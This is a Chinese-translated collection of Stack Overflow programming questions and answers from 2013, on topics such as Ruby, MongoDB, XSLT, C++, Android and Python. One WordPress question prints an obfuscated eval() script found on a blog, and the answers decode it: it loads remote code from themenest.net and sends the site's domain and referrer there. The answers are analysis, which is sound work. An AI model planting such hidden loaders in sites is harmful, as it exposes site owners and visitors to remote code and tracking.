切换顺序以进行简单修复，您可能希望授予 EDIT_PROFILES 用户 VIEW_PROFILES 权限（除了 EDIT_PROFILES 权限）。然后，考虑使用`access="hasAnyRole('REQUIRED_ROLE')"`而不是`access="hasRole('REQUIRED_ROLE')"`, 来简化访问语句。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-14T12:12:36.800

确保您的 EDIT_PROFILES 规则高于 VIEW_PROFILES 规则。如果您查看 VIEW_PROFILES 的表达式，您会发现它包含与 EDIT_PROFILES 匹配的每个 URL。这意味着如果 VIEW_PROFILES 规则是第一个，spring security 将永远不会尝试尝试 EDIT_PROFILES 规则。

# ruby - Ruby：根据冒号分隔符从字符串创建双精度数组

> ID：15998750
> 
> 赞同：-2
> 
> 时间：2013-04-14T11:52:34.687
> 
> 标签：ruby, string, multidimensional-array

我得到一个具有以下重复模式的字符串：标签（一个单词）、冒号、一些文本（几乎任何东西，甚至是空的）。例如：

```
"FileSize: 597262388 Duration_String: 1h 34mn Duration_string3: 01:34:12.564 Source_Duration:  Width: 712 Height: 360" 
```

我正在尝试根据标签和以下文本创建一个二维数组：

```
[["FileSize", "597262388"], ["Duration_String", "1h 34mn"], ["Duration_string3", "01:34:12.564"], ["Source_Duration", ""],  ["Width", "712"], ["Height", "360"]] 
```

我试过这段代码：

```
medinfo = "FileSize: 597262388 Duration_String: 1h 34mn Duration_string3: 01:34:12.564 Source_Duration:  Width: 712 Height: 360"
mi = medinfo.split(':')
s = []
mi.each do |x|
    x2 = x.split(/\W+/).last
    x1 = x.gsub(x2, '')
    s << x1
    s << x2
end
mi_pairs = (s[1..-1].each_slice 2).to_a 
```

但它并不适用于所有情况，我觉得必须有一个更简单的 ruby​​ 解决方案。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-14T12:09:33.957

对于给定的情况，以下脚本似乎对我有用：

```
medinfo = "FileSize: 597262388 Duration_String: 1h 34mn Duration_string3: 01:34:12.564 Source_Duration:  Width: 712 Height: 360"
arglist = medinfo.split /([\d\w_]+: )/
result = []
arglist.each_index {|i| result << [arglist[i].strip[0..-2], arglist[i+1].strip] if i.odd?} 
```

你会在`result`数组中找到你的结果。

编辑：如果您的值（不是键）包含以“：”（冒号，空格）结尾的单词，则您的正则表达式有问题，因为正则表达式会扫描此模式以分隔输入。

Edit2：在代码中发现了一个小缺陷。每个键都以“：”结尾。不必要的子字符串现在也被剥离了。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-14T16:03:36.100

虽然您已经解决了您的问题，但这只是您的问题的另一种解决方案：

```
medinfo = "FileSize: 597262388 Duration_String: 1h 34mn Duration_string3: 01:34:12.564 Source_Duration:  Width: 712 Height: 360"
str = medinfo.gsub(/([a-zA-Z_3]+)(:)/,'\1;')
mi = str.split(';')
s = []
mi.each do |x|
  x2 = x.split(/\W+/).last
  x1 = x.gsub(x2, '')
  s << x1.strip
  s << x2.strip
end
mi_pairs = (s[1..-1].each_slice 2).to_a 
```

# javascript - 这段代码在我的 Wordpress 博客上有什么作用？恶意软件？

> ID：15998753
> 
> 赞同：1
> 
> 时间：2013-04-14T11:53:02.063
> 
> 标签：javascript, wordpress

我发现每次网站加载时都会加载以下代码，请在我的博客上回复我关于它的功能？，

themenest.net 是我看到的网址，当我看到加载我的网站时

```
<script type="text/javascript">
    eval(function (p, a, c, k, e, r) {
        e = function (c) {
            return c.toString(a)
        };
        if (!''.replace(/^/, String)) {
            while (c--) r[e(c)] = k[c] || e(c);
            k = [function (e) {
                    return r[e]
                }
            ];
            e = function () {
                return '\\w+'
            };
            c = 1
        };
        while (c--) if (k[c]) p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c]);
        return p
    }('0.f(\'<2\'+\'3 5="6/7" 8="9://a.b/e/o/g?d=\'+0.h+\'&i=\'+j(0.k)+\'&c=\'+4.l((4.m()*n)+1)+\'"></2\'+\'3>\');', 25, 25, 'document||scr|ipt|Math|type|text|javascript|src|http|themenest|net|||platform|write|track|domain|r|encodeURIComponent|referrer|floor|random|1000|script'.split('|'), 0, {}));
</script> 
```

有谁知道 ？？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-14T11:58:07.187

如果你打开它，代码是：

```
document.write('<scr' + 'ipt type="text/javascript" src="http://themenest.net/platform/script/track?d=' + document.domain + '&r=' + encodeURIComponent(document.referrer) + '&c=' + Math.floor((Math.random() * 1000) + 1) + '"></scr' + 'ipt>'); 
```

`http://themenest.net/platform/script/track`...它通过传递有关它所在的文档的信息以及将您带到该文档的引用链接来检索脚本资源。我不知道该脚本资源可能是什么（它可能什么都不是，重点可能只是跟踪；查看浏览器的“网络”选项卡以查看返回的内容）。

是否是某种恶意软件取决于您与themenest.net 的关系。:-)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-14T11:59:45.310

该代码注入此脚本元素：

```
<script type="text/javascript" src="http://themenest.net/platform/script/track?d='+document.domain+'&r='+encodeURIComponent(document.referrer)+'&c='+Math.floor((Math.random()*1000)+1)+'"></script> 
```

它是一个跟踪器，很可能来自themenest（您最初获得主题的地方），它检测用户对主题的使用情况。这很可能是他们的分析脚本。

脚本得到：

*   你的[域名](https://developer.mozilla.org/en-US/docs/DOM/document.domain)（当前页面域名，使用主题的网站）
*   [推荐人](https://developer.mozilla.org/en-US/docs/DOM/document.referrer)（您在到达包含该脚本的该站点页面之前所在的位置）
*   并使用缓存破坏机制每次加载最新版本的脚本

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-14T11:55:11.400

这与推荐、跟踪和域有关。它已打包，因此无法读取确切的代码。仅当您打开包装时：

```
eval document.write('<scr'+'ipt type="text/javascript" src="http://themenest.net/platform/script/track?d='+document.domain+'&r='+encodeURIComponent(document.referrer)+'&c='+Math.floor((Math.random()*1000)+1)+'"></scr'+'ipt>'); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-14T11:56:51.837

看起来这适用于参考和/或记录参考域，如您所见

```
track|domain|r|encodeURIComponent|referrer 
```

您需要打开它才能看到真正的来源。

刚拆开包装，就可以了：

```
<script type="text/javascript" src="http://themenest.net/platform/script/track?d='+document.domain+'&r='+encodeURIComponent(document.referrer)+'&c='+Math.floor((Math.random()*1000)+1)+'"></script> 
```

正如我在上面所写的，它只是将您的域记录到 themenest.net 服务器。

我想所以找出侵犯版权的行为。

# c++ - 是否可以从媒体中心应用程序调用 c++ dll

> ID：15998757
> 
> 赞同：-1
> 
> 时间：2013-04-14T11:53:55.723
> 
> 标签：c++, winforms, dll

是否可以从媒体中心应用程序调用 c++ dll？我只是想在继续之前确认一下，因为我的测试一直给我错误。我成功地从 Winforms 应用程序调用 dll 方法。

谢谢

马特

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-03T03:28:49.950

毕竟它有效。请注意，不要为 32 位应用程序构建并期望它在 64 位应用程序上工作。

# android - 在动态壁纸中绘制位图

> ID：15998758
> 
> 赞同：0
> 
> 时间：2013-04-14T11:54:02.867
> 
> 标签：android, live-wallpaper

我正在尝试制作一个简单的动态壁纸，当用户触摸他的屏幕时，会在该位置绘制一个位图。我面临 2 个问题，如果我在 Runnable 中绘制它，那么它会不断创建位图，如果我在外面绘制它，它会不断闪烁。我注意到，如果我改变可运行闪烁的延迟时间也会改变，如果我完全删除可运行，那么它画得很好，但位置变得很奇怪。

这是我的代码。这个连续闪烁。

```
package com.example.live_wallpaper_p1;

import android.app.WallpaperManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Canvas;
import android.os.Bundle;
import android.os.Handler;
import android.service.wallpaper.WallpaperService;
import android.view.SurfaceHolder;

public class DemoWallpaperService extends WallpaperService {

    @Override
    public Engine onCreateEngine() {
        return new DemoWallpaperEngine();
    }

    private class DemoWallpaperEngine extends Engine{
        private boolean mVisible = false;
        private final Handler mHandler = new Handler();
        private Bitmap imm;
        private float xcor;
        private float ycor;
        BitmapFactory.Options option;       
        DemoWallpaperEngine()
        {
        imm = Bitmap.createBitmap(BitmapFactory.decodeResource(getResources(), R.drawable.icon, option));
        }

        private final Runnable mUpdateDisplay = new Runnable() {
        @Override
        public void run() {
            draw();
        }};

        @Override
        public Bundle onCommand(String action, int x, int y, int z, Bundle extras, boolean resultRequested) {
            if (action.equals(WallpaperManager.COMMAND_TAP)) {
                xcor=x;
                ycor=y;
                final SurfaceHolder holder = getSurfaceHolder();

                Canvas c = null;
                try {
                    c = holder.lockCanvas();
                    if (c != null) {
                    c.drawBitmap(imm, xcor-(imm.getWidth()/2), ycor-(imm.getHeight()/2),null);
                        //drawCube(c);
                    }
                } finally {
                    if (c != null)
                        holder.unlockCanvasAndPost(c);
                }

            }
            return null;
        }

        private void draw() {
           SurfaceHolder holder = getSurfaceHolder();
           Canvas c = null;
           try {
              c = holder.lockCanvas();
              if (c != null) {
                  //do something
              }
           } finally {
              if (c != null)
                 holder.unlockCanvasAndPost(c);
           }
           mHandler.removeCallbacks(mUpdateDisplay); 
      if (mVisible) {
              mHandler.postDelayed(mUpdateDisplay, 10); 

           } 
        }

        @Override
        public void onVisibilityChanged(boolean visible) {
            mVisible = visible;
            if (visible) {
                draw();
            } else {
                mHandler.removeCallbacks(mUpdateDisplay);
            }
        }

         @Override
          public void onSurfaceChanged(SurfaceHolder holder, int format, int width, int height) {
            draw();
          }

        @Override
        public void onSurfaceDestroyed(SurfaceHolder holder) {
            super.onSurfaceDestroyed(holder);
            mVisible = false;
            mHandler.removeCallbacks(mUpdateDisplay);
        }

        @Override
        public void onDestroy() {
             super.onDestroy();
             mVisible = false;
             mHandler.removeCallbacks(mUpdateDisplay);
        }
    }    
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T12:00:19.483

你可以试试这个示例代码

这里 imageURL 是图片位置的 http 链接

```
 Bitmap bitmap = BitmapFactory.decodeStream((InputStream)new URL(imageUrl).getContent());
    holder.itemImage.setImageBitmap(bitmap); 
```

如果您的图像在手机内存中。

用这个

```
image.setImageResource(R.drawable.test2); 
```

# mongodb - 大于$gt的mongodb条件查询返回零结果

> ID：15998764
> 
> 赞同：1
> 
> 时间：2013-04-14T11:55:01.573
> 
> 标签：mongodb, jax-rs, mongodb-query

我有一个 mongodb 数据库，它有一个包含以下文档的 users 集合

```
{
  "_id": ObjectId("5161446e03642eab4a818fcd"),
  "id": "35",
  "userInfo": {
  "name": "xyz",
  "rollNumber": 121
   }
} 
```

我想获取 id 大于特定值的所有行

```
@GET
@Path("/query")
@Produces({ MediaType.APPLICATION_JSON })
 public List<String> getLactionInfo(@QueryParam("from") int from) {
    BasicDBObject query = new BasicDBObject();
    // check if ids greater than 0
    query.put("id", new BasicDBObject("$gt", from));
    // get the collection of users
    DBCursor cursor = getTable("users").find(query);
    List<String> listUsers = new ArrayList<String>();
    while (cursor.hasNext()) {
        DBObject object = cursor.next();
        String id = cursor.next().get("_id").toString();
        object.put("_id", id);
        String objectToString = object.toString();
        listUsers.add(objectToString);

    }

    return listUsers;
} 
```

当我调试我的代码时，它显示 listUsers 为空。此外，当我在控制台中手动运行以下查询时，我没有得到任何结果。

```
db.users.find({id:{$gt:60}}) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-14T14:41:57.877

示例数据中的`id`存储为`string`. 因此，`$gt`检查试图将 a`integer`与 a进行比较`string`。

如果您将`id`值切换为`integer`，它应该可以按预期工作。

例如：

```
db.test.insert( { "id": 40, "name": "wired" } )
db.test.insert( { "id": 60, "name": "prairie" } )
db.test.insert( { "id": 70, "name": "stack" } )
db.test.insert( { "id": 80, "name": "overflow" } )
db.test.insert( { "id": "90", "name": "missing" } ) 
```

然后，测试：

```
> db.test.find({"id": { "$gt": 60 }}).pretty()
{
        "_id" : ObjectId("516abfdf8e7f7f35107081cc"),
        "id" : 70,
        "name" : "stack"
}
{
        "_id" : ObjectId("516abfe08e7f7f35107081cd"),
        "id" : 80,
        "name" : "overflow"
} 
```

为了快速修复数据，您可以从 shell 执行类似的操作（粘贴为一行并更改`myCollection`为您的集合名称：

```
db.myCollection.find().forEach(function(doc) { doc.id = parseInt(doc.id, 10); 
     db.test.save(doc); }) 
```

# xml - 使用 XSLT 转换内联 XML 元素

> ID：15998770
> 
> 赞同：1
> 
> 时间：2013-04-14T11:55:33.140
> 
> 标签：xml, xslt

有谁知道使用什么 XSLT 将以下内联 XML 元素转换为相应的 HTML？

XML:

```
<line><b c="foo1" /> bar <b c="foo2" /> bar <b c="foo3" /> bar</line> 
```

HTML：

```
<p><span class="x">foo1</span> bar <span class="x">foo2</span> bar <span class="x">foo3</span> bar </p> 
```

1.  'line' 变成 'p'
2.  每个“b”都变成一个“跨度”，我将提供一个“x”类
3.  每个 span 的内容将是相应 'b' 的 'c' 属性

我可以遍历文件中的每个“行”，并且可以遍历每行中的每个“b”，但是在输出中输出“行”的整个文本内容，然后将属性附加在文本之后。这是我正在使用的代码。我明白为什么下面的代码不能做我想要的。我只是不知道如何编写 XSLT 来做我想做的事。

```
<xsl:for-each select=".../line">
  <p>
    <xsl:value-of select="text"/>
    <xsl:for-each select="text/b">
      <span class="x">
        <xsl:value-of select="@c"/>
      </span>
    </xsl:for-each>
  </p>
</xsl:for-each> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-14T12:00:41.430

```
<xsl:template match="line">
  <p>
    <xsl:apply-templates/>
  </p>
</xsl:template>

<xsl:template match="b[@c]">
  <span class="x">
    <xsl:value-of select="@c"/>
  </span>
</xsl:template> 
```

应该足够了（因为文本节点由内置模板复制）。

# jquery - 为什么当元素设置为 display:none 时 jQuery 仍然检测为可见的元素？

> ID：15998771
> 
> 赞同：-1
> 
> 时间：2013-04-14T11:55:41.473
> 
> 标签：jquery

我正在使用 jQuery 循环遍历`sortable`列表并检测每个`list`可见的项目。

页面加载时从数据库查询中将元素添加到列表中。它们被隐藏使用`.hide()`. 可以将它们设置为从按钮可见，`.show()`以将它们“添加”到列表中。

**我想通过检测哪些可见来提取用户可见的列表状态。**

当我使用`:visible`选择器时，设置为的项目`display:none`仍在被拾取。根据`:visible`文档，项目仅在占用页面空间时才会被检测到，而这些项目不会。

[FIDDLE 这里，第 5 项设置为 display:none](http://jsfiddle.net/3PeMS/)

***请进行建设性的批评，而不是投反对票。***

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-29T13:42:29.160

由于答案很复杂，这基本上就是 Rob W 的建议：

```
//On button Click
$(".updateDetailsButton").click(function () {
    //Loop through each visible item in the sortable list
    $("#sortable li:visible").each(function(index) {
         // ...
    });
}); 
```

# timestamp - 电子表格修订历史

> ID：15998772
> 
> 赞同：0
> 
> 时间：2013-04-14T11:55:42.610
> 
> 标签：timestamp, report, block, revision-history

我一直认为这对我轻松/离线或“安排时间”对工作单元所做的更改有很大帮助。

当用户在下午 4 点更改单元格上的值或信息（最初在上午 12 点给出信息）时，可能会导致“未被注意到”的错误。

用户输入信息后，我看不到阻止单元格的方法

换句话说：单元格应该是“时间戳记”（用户看不见），然后在一天结束时，我报告了任何“时间差异”，即单元格 b2 的时间戳记为上午 10 点，再次被更改下午 4 点。

或者我不知道，其他可能有用的功能可能是：单元格 2 在上午 10 点更改。然后，在 10:10 封锁只有管理员才能解除封锁的单元格。

非常感谢

# python - python中基于文本的游戏

> ID：15998773
> 
> 赞同：1
> 
> 时间：2013-04-14T11:55:53.123
> 
> 标签：python

这是我的代码

```
direction = 0

while direction != ("quit"):
    direction = input("> ")
    if direction[0:4] != "quit" and direction != "go north" and direction != "go south" and direction != "go east" and direction != "go west" and direction != "go up" and direction != "go down" and direction[0:4] != "look":
        if direction[0:2] == "go" and direction[3:] == (""):
            print("please tell me more")
        else:
            print("huh?")

    elif direction[0:1] == "go" and direction != "north" and direction != "south" and direction != "east" and direction != "west" and direction != "up" and direction != "down":
        print ("please tell me more")

    elif direction[0:4] == "quit":
        print ("OK ... but a small part of you may never leave until you have personally saved Muirfieland from the clutches of evil .. Bwahahahahahah (sinister laugh).")

    elif direction[0:4] == "look":
        print ("You see nothing but endless void stretching off in all directions ...")

    else:
        print ("You wander of in the direction of " + direction) 
```

如果第一个单词被识别但第二个单词没有被识别，我试图将其添加到我的代码中，它会响应：“对不起，我害怕我不能这样做”我只是在我的代码中遇到了麻烦，任何帮助都会不胜感激谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-14T12:19:47.293

如此快速的分析......您正在制作文本解析器，其工作方式如下：

*   获取*“命令”*的第一个单词，如果我们不知道单词用户使用了无效输入 -> 通知并重新启动
*   如果用户使用了已知的*“命令”*，则解析其参数（如：、、）并让*“嵌套”*函数处理参数`go **north**``go **south**`

 *请注意，*“主要解析函数”*不需要知道参数`go()`是否有效，它只是将验证责任委托给`go()`.

所以我认为你应该像这样构建[代码（类）](http://docs.python.org/3.2/tutorial/classes.html)：

```
class Game:

    # Initialize internal variables, method automatically called on g = Game()
    def __init__(self):
        self._exit = False

        # Array of known commands, used in run, basically maps commands
            # to function and it says: if will get 'go' execute self._go
        self._commands = {
            'go': self._go,
            'quit': self._quit
        }

        # Array of go sub commands, used by _go
        self._commands_go = {
            'north': self._go_north
            # ...
        }

    # Mathod for parsing command, if it gets "comamnd" returns ("command",None)
    # if "command arg1 arg2" returns ("command", "arg1 arg2")
    @staticmethod
    def parse_command(string):
        string = str(string)
        index = string.find(' ')
        if index < 0:
            return (string, None)

        return (string[:index], string[index+1:])

    # This is main method; the only one which should be called from outside
    # It will just read data from input in never ending loop and parse commands
    def run(self):
        while not self._exit:
            src = input('> ')
            (command,args) = Game.parse_command( src)

            # Do we have this command, execute it
            if command in self._commands:
                self._commands[command](args)
            else:
                print( 'I\'m sorry I don\'t known command {}, try one of these:'.format(command))
                print( '\n'.join( self._commands.keys()))

    #######################################################
    # All game commands go here
    #######################################################
    def _quit(self,args):
        self._exit = True
        print( 'Bye bye')

    # Movement handling, will get executed when user types 'go ...' nad '...' will be in arg
    def _go(self,args):
        # No argument
        if args is None:
            print( 'Go excepts one of these:', '; '.join( self._commands_go.keys()))
            return False

        # Split sub command anr arguments
        (command,args) = Game.parse_command(args)
        if command not in self._commands_go:
            print( 'Go excepts one of these:', '; '.join( self._commands_go.keys()))
            return False

        if args is not None:
            print( 'Too many arguments for go')
            return False

        self._commands_go[command](args)
        return True

    # Go north
    def _go_north(self, args):
        print( 'Going north')

game = Game()
game.run() 
```

这将允许您：

*   构建复杂的嵌套命令
*   构建漂亮且可读的命令层次结构（`inventory item 123 update use potion 345`）而不是难读的复杂条件集
*   构建函数别名`go north`可以`gn`通过添加`'gn': self._go_north`到`_commands`
*   构建可重用的参数解析`(item_id, action, args) = self._parse_item_action(args)`
*   利用面向对象编程的优势（没有全局变量，一切都将是类属性，降低意外变量覆盖的风险）

如果你需要解析`goasdf`，`go`你可以简单地：

```
for i in self._commands:
    if input.startswirh( i):
        return self._commands[i](...)
print('Invalid command')
return False 
```

[注意：我没有测试过代码，这只是我的想法。]

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-14T12:21:49.593

您的代码对我来说看起来很混乱，这只是您的代码的一个更简单的版本：

```
flag = 0
count = 0

direction = 0

while direction != ("quit"):
    direction = input("> ")
    count += 1
    if recognised and count == 1: # word is recognised
       flag = 1
       print "whatever you want..."
    elif (not recognised) and count == 2 and flag == 1:
       flag = 0
       print "sorry, im afraid i cant do that"
    else:
       flag = 1
       print "second is recognised or whatever you want..." 
```

在我的代码中，如果第一次猜测被识别并增加计数，我已经设置了一个标志。第二次猜测，我只是检查标志和计数的值。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-14T12:23:24.397

与您的代码不是很相关，但是，当您可以获取用户输入时，将其拆分为一个列表并比较第一个单词，然后比较第二个单词，因此可能类似于

```
 user = user_input("> ")
    user = user.split()

    if user[0] == "look"
        if user[1] == "left"
            do something
        if user[1] == "right"
            do something
        else
            print ("sorry, im afraid i cant do that") 
```

不知道这是否是你要找的东西

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-14T16:29:26.553

简单地说，我认为你需要学习更多的代码来让你自己在这里变得更容易，尽管类可能有点多，我并不是以一种侮辱的方式。

作为一个简单的开始，我建议使用 in 关键字而不是 ==。

例如：

```
if "north" in direction:
    do something 
```

如果输入是北、北、向北、请向北等，这将“做某事”。

因此，为了解决您的问题，您的代码可以使用如下内容：

```
input = ("> ")
if "go" in input and not ("north" in input and "south" in input...):
    print "That is not a direction you can go in." 
```

等等。“而不是（...）”部分可以重写得更整洁，但我按原样写它是为了更容易地显示正在发生的事情。

```
truthcase = None
directions = ["north", "south", ...]

for i in directions:
     if i not in input:
         continue
     else:
         truthcase = True
     truthcase = False 

if "go" in input and not truthcase:
    print something 
```

希望这会有所帮助。*

# c++ - windows上clang的运行时库

> ID：15998778
> 
> 赞同：4
> 
> 时间：2013-04-14T11:56:26.067
> 
> 标签：c++, windows, visual-c++, llvm, clang

我按照[手册使用 VS9 构建了](http://clang.llvm.org/get_started.html#buildWindows)**clang**。

我已经编译了代码：

```
void foo()
{
    try
    {
        throw 1;
    }
    catch(int)
    {}
} 
```

到目标文件。它具有外部依赖项：

```
___cxa_allocate_exception
__ZTIi
___cxa_throw 
```

我猜这些来自运行时库。但是我应该使用哪一个？我应该构建 libc++ 吗？稳定吗？

PS：我不想对 cygwin/mingw 有任何依赖

PPS：但似乎 mingw 是我需要的……它是唯一可行的选择吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T14:09:25.397

您需要 C++ ABI 库。libc++ 在这里帮不了你。您需要 libc++abi 或 libsupc++ 或类似的东西。

# maven - Selenium 服务器尝试启动 Safari 浏览器进行 Firefox 测试

> ID：15998782
> 
> 赞同：1
> 
> 时间：2013-04-14T11:56:34.290
> 
> 标签：maven, selenium, selenium-webdriver

我在使用以 selenium-maven-plugin 启动的 selenium 服务器时遇到问题。服务器正常启动命令

```
mvn selenium:start-server 
```

然后，我运行以下测试：

```
@Test
public void simpleTest() throws Exception {
    WebDriver driver = new RemoteWebDriver(new URL("http://localhost:4444/wd/hub"), DesiredCapabilities.firefox());
    driver.get("http://localhost:8080/todolist-web/todo");
    Assert.assertEquals("Todos", driver.getTitle());
    driver.quit();
} 
```

我得到以下异常：

> java.lang.RuntimeException：在路径中找不到 Safari！请将包含 ''Safari.exe'' 的目录添加到您的 PATH 环境变量中，或者像这样明确指定 Safari 的路径：safari c:\blah\Safari.exe`

的确，我的计算机上没有安装 Safari，但正如您所见，我运行了 Firefox 测试。那么它为什么要寻找 Safari 浏览器呢？

我的 pom.xml 包含 2 个罐子：

```
 - org.seleniumhq.selenium selenium-server 2.31.0  
 - org.seleniumhq.selenium selenium-firefox-driver 2.31.0 
```

请注意，如果我使用以下代码（在 my 之前添加`simpleTest()`）而不是 maven 命令来启动 selenium 服务器，它可以正常工作。

```
private static SeleniumServer server;
@BeforeClass
public static void setUpTest() throws Exception {
    RemoteControlConfiguration conf = new RemoteControlConfiguration();
    conf.setPort(4444);
    conf.setDebugURL("/wd/hub");
    server = new SeleniumServer(conf);
    server.start();
}

@AfterClass
public static void tearDownTest() {
    server.stop();
} 
```

# c++ - 使用擦除和插入替换向量中的元素

> ID：15998783
> 
> 赞同：7
> 
> 时间：2013-04-14T11:56:39.633
> 
> 标签：c++, vector, insert, iterator, erase

```
void replace(vector<string> my_vector_2, string old, string replacement){

    vector<string>::iterator it;
    for (it = my_vector_2.begin(); it != my_vector_2.end(); ++it){

        if (*it==old){
            my_vector_2.erase(it);
            my_vector_2.insert(it,replacement);

        }
    }

} 
```

所以，我希望这个函数用字符串替换替换向量中所有出现的旧字符串。但是当调用这个函数时，它根本不会改变向量。我不确定我是否正确使用了擦除和插入功能。有任何想法吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-14T12:02:23.177

首先，您需要通过引用而不是值传递向量。

```
void replace(vector<string>& my_vector_2, string old, string replacement){ 
```

第二次擦除和插入[使其无效](https://stackoverflow.com/questions/6438086/iterator-invalidation-rules)，您需要使用擦除返回的新迭代器对其进行更新

```
it = my_vector_2.erase(it);  
it = my_vector_2.insert(it,replacement); 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-04-14T12:04:21.463

您的问题有一个现成的[算法](http://en.cppreference.com/w/cpp/algorithm/replace)：

```
#include <algorithm>
#include <string>
#include <vector>

std::vector<std::string> v;  // populate

std::replace(v.begin(), v.end(), "old", "new"); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-14T12:02:40.257

您正在传递您`std::vector`的价值。为了更改`std::vector`您传递给函数的参数，请将其声明为引用

```
void replace(vector<string>& my_vector_2, string old, string replacement){ } 
```

`&`表示您通过引用传递您的`std::vector`，因此您可以访问您传递的对象。

并且不要删除元素，只需替换它。

# css - 移动设备上的错误 css

> ID：15998797
> 
> 赞同：0
> 
> 时间：2013-04-14T11:58:14.820
> 
> 标签：css, mobile, mobile-safari

您好我刚开始为移动设备开发应用程序，有下一个麻烦。此站点：[http](http://dimax.co.il/development/test-ding/OscarWilde/#/menu) : //dimax.co.il/development/test-ding/OscarWilde/#/menu 在 PC 浏览器上正确显示，但在 iPhone 4S 上的 Safari 上，它应该全屏显示，但比全屏少得多. 你可以在那里看到所有的CSS。感谢帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-14T12:01:47.340

确保您在头部设置了视口

```
<meta name="viewport" content="initial-scale=1.0"> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-14T12:30:31.820

移动网站更完整的答案是：

```
 <meta name="viewport" content="width=device-width, initial-scale=1.0 maximum-scale=1, user-scalable=no" /> 
```

# python - Python中对象之间的通信

> ID：15998799
> 
> 赞同：4
> 
> 时间：2013-04-14T11:58:26.453
> 
> 标签：python, class, object, function

我有这样的事情：

```
class exampleClass(object):

    def doSomething(self,number):
        return number + 1

class exampleClass2(exampleClass):
    def callDefDoSomething(self):
        print exampleClass.doSomething(5)

exampleClass2.callDefDoSomething() 
```

-

```
TypeError: unbound method callDefDoSomething() must be called
with exampleClass2 instance as first argument (got nothing instead) 
```

我开始学习 Python 中的对象，但我找不到解决方案:(

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-14T12:07:02.740

您需要创建该类的一个实例，即一个活动对象，以使事情正常进行：

```
class exampleClass(object):

    def doSomething(self,number):
        return number + 1 

class exampleClass2(exampleClass):

    def __init__(self):
        self.member1 = exampleClass()

    def callDefDoSomething(self):
        print self.member1.doSomething(5)

object2 = exampleClass2()
object2.callDefDoSomething() 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-14T12:14:45.230

只能为实例调用常规类方法，不能为类调用。所以如果你想调用 callDefDoSomething 你必须先实例化 exampleClass2。您还必须在对 callDefDoSomething 的调用中实例化 exampleClass。

```
class exampleClass(object):

    def doSomething(self,number):
        return number + 1

class exampleClass2(exampleClass):
    def callDefDoSomething(self):
        exampleClassInstance = exampleClass()
        print exampleClassInstance.doSomething(5)

exampleClass2Instance = exampleClass2()

exampleClass2Instance.callDefDoSomething() 
```

如果你想在类上调用方法，你应该试试 classmethods。检查python 教程中关于[类的文档。](http://docs.python.org/2/tutorial/classes.html)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-14T12:04:47.590

`doSomething`是一种方法`exampleClass`。因此，必须为此类的实例调用它。

在`callDefDoSomething`中，您使用

```
exampleClass.doSomething(5) 
```

`exampleClass`但是，它不是此类的*实例*，而是类本身。你想在这里使用的是

```
self.doSomething(5) 
```

`self`指的是 exampleClass2 的实例`, for which`callDefDoSomethings exampleClass` `is invoked, which, due to inheritance, is an instance of`。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-14T12:42:07.487

你可以使用这个：

```
class exampleClass(object):
    def doSomething(self,number):
        return number + 1

class exampleClass2(exampleClass):
    def callDefDoSomething(self):
        print super(exampleClass2,self).doSomething(5)

example = exampleClass2()
example.callDefDoSomething() 
```

# python - Python 错误 - ImportError：没有名为“webapp2”的模块

> ID：15998801
> 
> 赞同：4
> 
> 时间：2013-04-14T11:58:40.373
> 
> 标签：python, google-app-engine

我是 Python 的初学者，在我的机器上本地运行我的 python googleppengine 代码时遇到了很大的困难。

我的代码如下所示：

```
import json
import urllib
import os
import webapp2
from google.appengine.ext.webapp import template
import datetime
from google.appengine.ext import db

class Events(db.Model):
    venue_name = db.StringProperty()
    address = db.StringProperty()
    id = db.StringProperty()
    venue_id = db.StringProperty()

    # hire_date = db.DateProperty()
    # attended_hr_training = db.BooleanProperty()

class eventSearch(webapp2.RequestHandler):  
    def get(self):
        base_url = 'http://api.eventful.com/json/events/search?app_key=zGtDX6cwQjCRdkf6&l=dublin&?q=music'
        response = urllib.urlopen(base_url)
        html = response.read()
        html = json.loads(html)
        result = html['venues']
        result1 = result['venue'] 
```

当我在 cmd 提示符下使用命令“python file.py”运行此代码时，我收到以下错误：

```
Traceback <most recent call last>:
File "file.py", line 4, in <module>
import webapp2
ImportError: No module named 'webapp2' 
```

[我有 1\. 按照如何在 Windows 中添加到 pythonpath 中的](https://stackoverflow.com/questions/3701646/how-to-add-to-the-pythonpath-in-windows-7)建议创建了一个 PythonPath ？ 在我的带有目录的系统变量中：C:\Python33\DLLs;C:\Python33\Lib;C:\Python33\Lib\lib2to3;C:\Program Files (x86)\Google\google_appengine;C:\Program Files (x86 )\谷歌\google_appengine\lib;

然后，我还将以下两个目录添加到我的“PATH”变量中，正如答案中所建议的那样 - [即使我没有安装 webapp2，import webapp2 也适用于 google-app-engine](https://stackoverflow.com/questions/9509276/import-webapp2-works-on-google-app-engine-even-though-i-dont-have-webapp2-insta)
C:\Program Files (x86)\ Google\google_appengine\;C:\Program Files (x86)\Google\google_appengine\lib

